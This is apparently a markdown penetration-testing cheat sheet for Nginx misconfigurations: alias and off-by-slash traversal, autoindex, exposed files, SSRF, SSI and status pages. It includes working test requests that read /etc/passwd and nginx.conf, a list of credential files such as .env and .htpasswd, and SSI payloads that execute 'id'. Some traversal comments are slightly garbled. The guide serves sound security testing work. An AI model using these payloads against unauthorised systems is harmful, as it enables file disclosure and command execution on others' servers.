# Nginx Security Testing

## Overview
Security misconfigurations and vulnerabilities in Nginx web server deployments.

## Common Misconfigurations

### Path Traversal via Alias
```
# Vulnerable nginx config:
location /static {
    alias /var/www/static/;
}

# If missing trailing slash in location:
GET /static../etc/passwd
# Nginx resolves: /var/www/static/../etc/passwd → /var/www/etc/passwd
# Or: /static../secret → /var/www/staticc/../secret = traversal

# Test:
curl https://target.com/static../etc/passwd
curl https://target.com/static../etc/nginx/nginx.conf
```

### Off-by-Slash
```
# If location /api { proxy_pass http://backend/api; }
# Missing trailing slash creates off-by-slash

# Test:
GET /api../internal-endpoint
GET /api../admin
```

### Merge Slashes
```
# Default: merge_slashes on (// → /)
# If disabled: merge_slashes off
# Path traversal possible with double slashes
GET //etc/passwd
GET /./etc/passwd
GET /%2f%2fetc/passwd
```

### Internal Location Exposure
```
# Nginx internal locations
location /internal {
    internal;  # Only accessible from Nginx internals
}
# Test if directly accessible: GET /internal → should return 404

# X-Accel-Redirect abuse
# If app sets X-Accel-Redirect header, Nginx serves that file
# Test: can you make app return X-Accel-Redirect: /etc/passwd?
```

### CRLF in Headers
```
# Nginx may not sanitize all headers
# Test CRLF injection in user-controlled headers
# See crlf_injection.md
```

### Autoindex
```
# Autoindex on = directory listing enabled
location /uploads {
    autoindex on;
}

# Test: GET /uploads/ → should NOT show directory listing
# If enabled → can list all uploaded files
```

### Exposed Sensitive Files
```
# Test common exposed files:
/.git/ → source code
/.env → environment variables
/nginx.conf → configuration
/.htpasswd → basic auth credentials
/wp-config.php → WordPress config

# Check nginx default error pages for version disclosure
# Nginx/1.x.x in Server header
curl -I https://target.com
```

### HTTP Header Injection via Nginx Proxy
```
# Nginx may forward certain headers to backend
# Test: does Nginx forward X-Forwarded-For? X-Real-IP?
# Can we inject headers through Nginx to backend?
```

## Server-Side Request Forgery via Nginx
```
# If Nginx configured as forward proxy (rare but exists)
GET http://internal-service:8080/admin HTTP/1.1
Host: target.com

# If `resolver` directive allows internal DNS resolution
```

## Nginx Server-Side Includes (SSI)
```
# If SSI enabled:
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->

# Check if enabled: check response for SSI processing
# Try in file uploads, user-generated content
```

## HTTP/2 Specific
```
# H2C upgrade attacks
# Request smuggling via HTTP/2 to HTTP/1.1 downgrade
# See http_request_smuggling.md
```

## Nginx Status Page
```
# Exposed status module:
GET /nginx_status → shows connections, requests
GET /status

# May reveal internal IP addresses, request counts
```

## Testing Methodology
1. Check Nginx version (Server header, error pages)
2. Test alias traversal (off-by-slash)
3. Check for autoindex on sensitive directories
4. Look for exposed sensitive files
5. Test CRLF injection
6. Check if internal locations are accessible
7. Look for /nginx_status exposure
8. Test SSI if applicable
9. Check proxy_pass configurations for SSRF

## Tools
- `nikto` for common misconfigurations
- `nuclei -t nginx/` templates
- Manual testing with Burp Suite
- `nginx-lint` for config analysis
